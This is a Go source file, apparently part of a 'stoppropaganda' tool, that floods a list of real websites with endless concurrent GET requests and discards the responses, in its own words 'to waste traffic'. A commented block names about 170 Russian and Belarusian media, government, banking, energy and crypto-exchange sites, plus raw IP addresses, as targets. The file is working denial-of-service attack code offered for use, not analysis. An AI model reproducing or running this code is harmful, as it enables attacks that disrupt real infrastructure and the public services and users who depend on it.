package stoppropaganda

import (
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"sync"
	"encoding/json"
	"fmt"
)

// Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233


type TargetWebsites map[string]struct{}

func LoadSites() TargetWebsites {
    // Let's first read the `config.json` file
	fmt.Println("Loading sites")
    content, _ := ioutil.ReadFile("./data/sites.json")
	fmt.Println(content)
 
    // Now let's unmarshall the data into `payload`
    var payload TargetWebsites
    json.Unmarshal(content, &payload)
 
	return payload
}

var targetWebsites = LoadSites()

/*

var targetWebsites = map[string]struct{}{

	"https://bukimevieningi.lt": {},
	"https://musutv.lt":         {},
	"https://baltnews.lt":       {},
	"https://lt.rubaltic.ru":    {},
	"http://sputniknews.lt":     {},
	"https://lv.sputniknews.ru": {},
	"https://viada.lt":          {},


	"https://lenta.ru":          {},
	"https://ria.ru":            {},
	"https://ria.ru/lenta":      {},
	"https://www.rbc.ru":        {},
	"https://www.rt.com":        {},
	"https://smotrim.ru":        {},
	"https://tass.ru":           {},
	"https://tvzvezda.ru":       {},
	"https://vsoloviev.ru":      {},
	"https://www.1tv.ru":        {},
	"https://www.vesti.ru":      {},
	"https://zakupki.gov.ru":    {},
	"https://er.ru":             {},
	"https://www.rzd.ru":        {},
	"https://rzdlog.ru":         {},
	"https://vgtrk.ru":          {},
	"https://www.interfax.ru":   {},
	"https://ugmk.ua":           {},
	"https://iz.ru":             {},
	"https://vz.ru":             {},
	"https://sputniknews.ru":    {},
	"https://www.gazeta.ru":     {},
	"https://www.kp.ru":         {},
	"https://riafan.ru":         {},
	"https://pikabu.ru":         {},
	"https://www.kommersant.ru": {},
	"https://omk.ru":            {},
	"https://www.yaplakal.com":  {},
	"https://bezformata.com":    {},
	"https://regnum.ru":         {},
	"https://eadaily.com":       {},
	"https://www.rubaltic.ru":   {},

	"https://www.gazprom.ru":                    {},
	"https://lukoil.ru":                         {},
	"https://magnit.ru":                         {},
	"https://www.nornickel.com":                 {},
	"https://www.surgutneftegas.ru":             {},
	"https://www.tatneft.ru":                    {},
	"https://www.evraz.com/ru":                  {},
	"https://nlmk.com":                          {},
	"https://www.sibur.ru":                      {},
	"https://www.severstal.com":                 {},
	"https://www.metalloinvest.com":             {},
	"https://nangs.org":                         {},
	"https://rmk-group.ru/ru":                   {},
	"https://www.tmk-group.ru":                  {},
	"https://ya.ru":                             {},
	"https://www.polymetalinternational.com/ru": {},
	"https://www.uralkali.com/ru":               {},
	"https://www.eurosib.ru":                    {},

	"https://www.sberbank.ru":                          {},
	"https://online.sberbank.ru":                       {},
	"https://www.vtb.ru":                               {},
	"https://www.gazprombank.ru":                       {},
	"https://api.developer.sber.ru/product/SberbankID": {},
	"https://api.sberbank.ru/prod/tokens/v2":           {},
	"https://api.sberbank.ru/prod/tokens/v2/oauth":     {},
	"https://api.sberbank.ru/prod/tokens/v2/oidc":      {},
	"https://www.moex.com":                             {},
	"http://www.fsb.ru":                                {},

	"https://gosuslugi.ru":         {},
	"https://www.mos.ru/uslugi":    {},
	"http://kremlin.ru":            {},
	"http://en.kremlin.ru":         {},
	"http://government.ru":         {},
	"https://mil.ru":               {},
	"https://www.nalog.gov.ru":     {},
	"https://customs.gov.ru":       {},
	"https://pfr.gov.ru":           {},
	"https://rkn.gov.ru":           {},
	"https://www.gosuslugi.ru":     {},
	"https://gosuslugi41.ru":       {},
	"https://uslugi27.ru":          {},
	"https://gosuslugi29.ru":       {},
	"https://gosuslugi.astrobl.ru": {},

	"https://109.207.1.118":          {},
	"https://109.207.1.97":           {},
	"https://mail.rkn.gov.ru":        {},
	"https://cloud.rkn.gov.ru":       {},
	"https://mvd.gov.ru":             {},
	"https://pwd.wto.economy.gov.ru": {},
	"https://stroi.gov.ru":           {},
	"https://proverki.gov.ru":        {},
	"https://shop-rt.com":            {},

	"https://cleanbtc.ru":       {},
	"https://bonkypay.com":      {},
	"https://changer.club":      {},
	"https://superchange.net":   {},
	"https://mine.exchange":     {},
	"https://platov.co":         {},
	"https://ww-pay.net":        {},
	"https://delets.cash":       {},
	"https://betatransfer.org":  {},
	"https://ramon.money":       {},
	"https://coinpaymaster.com": {},
	"https://bitokk.biz":        {},
	"https://www.netex24.net":   {},
	"https://cashbank.pro":      {},
	"https://flashobmen.com":    {},
	"https://abcobmen.com":      {},
	"https://ychanger.net":      {},
	"https://multichange.net":   {},
	"https://24paybank.ne":      {},
	"https://royal.cash":        {},
	"https://prostocash.com":    {},
	"https://baksman.org":       {},
	"https://kupibit.me":        {},


	"https://mininform.gov.by":       {},
	"https://rec.gov.by/ru":          {},
	"https://www.mil.by":             {},
	"https://www.government.by":      {},
	"https://president.gov.by/ru":    {},
	"https://www.mvd.gov.by/ru":      {},
	"http://www.kgb.by/ru":           {},
	"https://www.prokuratura.gov.by": {},

	"https://www.nbrb.by":                 {},
	"https://belarusbank.by":              {},
	"https://brrb.by":                     {},
	"https://www.belapb.by":               {},
	"https://bankdabrabyt.by":             {},
	"https://belinvestbank.by/individual": {},

	"https://bgp.by/ru":           {},
	"https://www.belneftekhim.by": {},
	"http://www.bellegprom.by":    {},
	"https://www.energo.by":       {},
	"http://belres.by/ru":         {},

	"http://belta.by":           {},
	"https://sputnik.by":        {},
	"https://www.tvr.by":        {},
	"https://www.sb.by":         {},
	"https://belmarket.by":      {},
	"https://www.belarus.by":    {},
	"https://belarus24.by":      {},
	"https://ont.by":            {},
	"https://www.024.by":        {},
	"https://www.belnovosti.by": {},
	"https://mogilevnews.by":    {},
	"https://yandex.by":         {},
	"https://www.slonves.by":    {},
	"http://www.ctv.by":         {},
	"https://radiobelarus.by":   {},
	"https://radiusfm.by":       {},
	"https://alfaradio.by":      {},
	"https://radiomir.by":       {},
	"https://radiostalica.by":   {},
	"https://radiobrestfm.by":   {},
	"https://www.tvrmogilev.by": {},
	"https://minsknews.by":      {},
	"https://zarya.by":          {},
	"https://grodnonews.by":     {},
}
*/

var websites = map[string]*Website{}

type Website struct {
	Requests     uint   `json:"requests"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`

	Counter_code100 uint `json:"status_100"`
	Counter_code200 uint `json:"status_200"`
	Counter_code300 uint `json:"status_300"`
	Counter_code400 uint `json:"status_400"`
	Counter_code500 uint `json:"status_500"`

	mux *sync.Mutex
}

func (ws *Website) Start(endpoint string) {
	websiteURL, err := url.Parse(endpoint)
	if err != nil {
		panic(err)
	}

	f := func() {
		for {
			// Create request
			req, err := http.NewRequest("GET", endpoint, nil)
			if err != nil {
				panic(err)
			}

			// Set headers
			req.Header.Set("Host", websiteURL.Host)
			req.Header.Set("User-Agent", *flagUserAgent)
			req.Header.Set("Accept", "*/*")

			// Perform request
			resp, err := httpClient.Do(req)
			if err != nil {
				ws.mux.Lock()
				ws.Requests++
				ws.Errors++
				ws.LastErrorMsg = err.Error()
				ws.mux.Unlock()
				continue
			}

			// Increase counters
			ws.mux.Lock()
			ws.Requests++
			if resp.StatusCode >= 100 && resp.StatusCode < 200 {
				ws.Counter_code100++
			} else if resp.StatusCode >= 200 && resp.StatusCode < 300 {
				ws.Counter_code200++
			} else if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				ws.Counter_code300++
			} else if resp.StatusCode >= 400 && resp.StatusCode < 500 {
				ws.Counter_code400++
			} else if resp.StatusCode >= 500 && resp.StatusCode < 600 {
				ws.Counter_code500++
			}
			ws.mux.Unlock()

			// Download (and discard) response body to waste traffic
			_, err = io.Copy(ioutil.Discard, resp.Body)
			if err != nil {
				ws.mux.Lock()
				ws.Errors++
				ws.mux.Unlock()
			}
			resp.Body.Close()
		}
	}

	for i := 0; i < *flagWorkers; i++ {
		go f()
	}
}
